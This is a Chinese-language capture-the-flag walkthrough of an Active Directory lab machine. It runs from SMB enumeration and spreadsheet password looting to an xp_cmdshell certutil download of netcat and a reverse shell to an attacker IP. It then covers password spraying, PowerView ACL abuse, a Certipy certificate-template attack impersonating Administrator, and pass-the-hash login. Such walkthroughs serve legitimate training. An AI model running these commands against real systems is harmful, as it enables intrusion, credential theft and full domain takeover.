#### 扫描端口
**nmap -sC -T4 -sV --open 10.129.232.128**   
PORT     STATE SERVICE    VERSION
53/tcp   open  tcpwrapped
88/tcp   open  tcpwrapped
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
389/tcp  open  tcpwrapped
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: TLS randomness does not represent time
445/tcp  open  tcpwrapped
464/tcp  open  tcpwrapped
593/tcp  open  tcpwrapped
636/tcp  open  tcpwrapped
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
1433/tcp open  tcpwrapped
3268/tcp open  tcpwrapped
3269/tcp open  tcpwrapped
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
5985/tcp open  tcpwrapped

#### 发现SMB开放，共享目录枚举
```
netexec smb 10.129.232.128 -u rose -p 'KxEPkKe6R8su' --shares
```

SMB         10.129.232.128     445    DC01             Share           Permissions     Remark
SMB         10.129.232.128     445    DC01             -----           -----------     ------
SMB         10.129.232.128     445    DC01             Accounting Department READ            
SMB         10.129.232.128     445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.128     445    DC01             C$                              Default share
SMB         10.129.232.128     445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.128     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.128     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.232.128     445    DC01             Users           READ            

#### 发现Accounting Department 目录，枚举目录文件
```
smbmap -H 10.129.232.128 -u rose -p 'KxEPkKe6R8su' -r 'Accounting Department/'
smbclient //10.129.232.128/'Accounting Department' -U rose%'KxEPkKe6R8su' -c 'ls'
```

![Pasted image 20250724142727](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724142727.png)

#### 下载共享目录中的文件
```
smbclient //10.129.232.128/'Accounting Department' -U rose%'KxEPkKe6R8su'
```


#### 进入交互式 shell 后： 
```
smb: \> get accountis.xlsx
smb: \> quit # 退出
```



#### 获取到一些账号密码
![Pasted image 20250724143037](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724143037.png)

#### 将username和password分别保存为字典，进行SMB爆破

```
netexec smb 10.129.232.128 -u users.txt -p pass.txt
```

![Pasted image 20250724145352](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724145352.png)

**发现有效账号：oscar:86LxLBMgEWaKUnBG**

**通过之前的端口扫描，知道目标中开启了MSSQL服务，使用文件中的账号密码对尝试登录**

![Pasted image 20250724145733](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724145733.png)

**我们看到这是有效的，我们可以继续使用impack -mssqlclient连接到主机**

```
impacket-mssqlclient sequel.htb/'用户名:密码'@10.129.232.128
```

![Pasted image 20250724145916](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724145916.png)



**通过xp_cmdshell获取该主机权限**
-- 启用高级选项
sp_configure 'show advanced options', 1;
RECONFIGURE;
-- 启用 xp_cmdshell
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

![Pasted image 20250724150100](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724150100.png)



**反弹shell**

**可以给目标机器上传一个nc：**
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.16.2:9988/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe'

**在目标机器上执行反弹shell：**
**EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.16.2 9999';**

![Pasted image 20250724151057](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724151057.png)

**查看C盘根目录中存在 sqlserver 2019**
![Pasted image 20250724151239](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724151239.png)

**查看配置文件sql-Configuration.INI，获取到配置文件信息**

![Pasted image 20250724151528](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724151528.png)



**查看系统中的用户：net user**
![Pasted image 20250724151646](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724151646.png)



**将这些用户保存为用户名字典，通过在sql-Configuration.INI中收集到的密码进行密码喷洒**

```
netexec smb sequel.htb -u users.txt -p 'WqSZAF6CysDQbGb3'
```

**找到账号ryan**
![Pasted image 20250724152041](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724152041.png)



**通过evil-winrm连接到ryan用户**

![Pasted image 20250724152315](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724152315.png)




**通过bloodhound-python收集域的相关信息，并进行分析**
https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors  （传到目标主机上）
https://github.com/dirkjanm/BloodHound.py

**bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.129.232.128 -c all --zip**

**快速使用：https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart**

![Pasted image 20250724163829](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724163829.png)



**上分析可知道ryan对ca_svc具有WriteOwner权限**

**使用PowerView修改ca_sv的密码（https://github.com/PowerShellMafia/PowerSploit）**

**将PowerView上传到目标机器，并导入**

```
Import-Module .\PowerView.ps1
```

**将 `ca_svc` 的所有者修改为名为 `ryan` 的用户或组**

```
Set-DomainObjectOwner -Identity "ca_svc"  -OwnerIdentity "ryan"
```

```
执行此命令需要对 `ca_svc` 对象拥有 `WriteOwner` 权限（或通过其他方式获得的权限，如管理员权限）。修改后，`ryan` 将成为 `ca_svc` 对象的所有者，默认拥有对该对象的 `TakeOwnership` 权限，可能间接获得更多控制能力。
```

**将给ca_svc用户重置密码的权限赋予给ryan**

```
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
```

```
执行后，`ryan` 将获得对 `ca_svc` 账户的密码重置权限，可直接修改 `ca_svc` 的密码（无需知道原密码），使用该命令需具备相应的权限（如对 `ca_svc` 对象的 `WriteDacl` 权限）
```

**创建一个安全字符串（SecureString）类型的凭据对象：**

```
$cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force
```

```
ConvertTo-SecureString：是 PowerShell 的内置 cmdlet，用于将普通文本字符串转换为加密的安全字符串（SecureString），这种类型的字符串在内存中以加密形式存储，避免明文暴露。

"Password123!!"：是需要转换的原始明文密码。

-AsPlainText：指定输入的是明文文本（因为默认情况下该 cmdlet 要求输入已加密的字符串）。
-Force：强制允许将明文转换为安全字符串（由于明文处理存在安全风险，此参数用于确认操作）。

$cred = ...：将转换后的安全字符串赋值给变量 $cred，后续可用于创建 PSCredential 对象（完整的凭据包含用户名和安全字符串密码），常用于需要身份验证的操作（如远程连接、访问受保护资源等）。
```

**修改密码**

```
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
```

**验证密码是否修改成功**

```
netexec smb sequel.htb -u ca_svc -p 'Password123!!'
```

![Pasted image 20250724171738](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724171738.png)



**查看用户 ca_svc 的属性，我们发现他们是“证书发布者”组的成员。在 BloodHound 中查看该组的描述，我们看到该组成员被允许将证书发布到目录中。这表明存在 Active Directory 证书服务。**

![Pasted image 20250724172128](E:\资料\HTB靶场解析\HTB-wp\Pasted image 20250724172128.png)

**然后，我们使用 ca_svc 的凭据通过 Certipy （https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation）枚举证书模板和配置，Certipy 是一个用于枚举和利用 Active Directory 证书服务（ADCS)漏洞的工具**

```
certipy find -u 'ca_svc@sequel.htb' -p 'Password123!!' -dc-ip 10.129.232.128 -stdout
```

**我们看到DunderMifflinAuthentication模板是易受攻击的，因为Cert发布者组具有危险权限。让我们首先将证书模板修改为使其可被ca_svc利用。我们使用证书模板命令来更新模板配置，同时保存原始设置的备份。（-save-old 在新版本的工具中没有该指令，使用-save-configuration dunder_backup.json替代）**

```
certipy template -u ca_svc@sequel.htb -p 'Password123!!' -template DunderMifflinAuthentication -save-old -dc-ip 10.129.232.128
```

![image-20250726212520108](E:\资料\HTB靶场解析\HTB-wp\image-20250726212520108.png)
![image-20250726212536100](E:\资料\HTB靶场解析\HTB-wp\image-20250726212536100.png)



**此命令更新模板以允许不需要管理器的证书请求审批并确保启用了客户端身份验证扩展密钥使用。有了这个设置，我们可以向高度特权的用户（如Administrator）请求证书。如果我们运行证书再次发现，我们看到模板易受ESC1， ESC2， ESC3和ESC4的攻击。这证实了我们可以充分利用此证书模板来模拟任何用户，包括域管理员。**

**我们可以通过请求一个模拟域的证书来继续利用这一点管理员。**

```
certipy req -username ca_svc@sequel.htb -p 'Password123!!' -ca sequel-DC01-CA -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb -dns dc01.sequel.htb
```

**然后我们使用生成的证书作为管理员进行身份验证，并提取NT哈希**

```
certipy auth -pfx administrator.pfx -domain sequel.htb
```

**然后通过hash进行登录**

```
evil-winrm -i 10.129.232.128 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

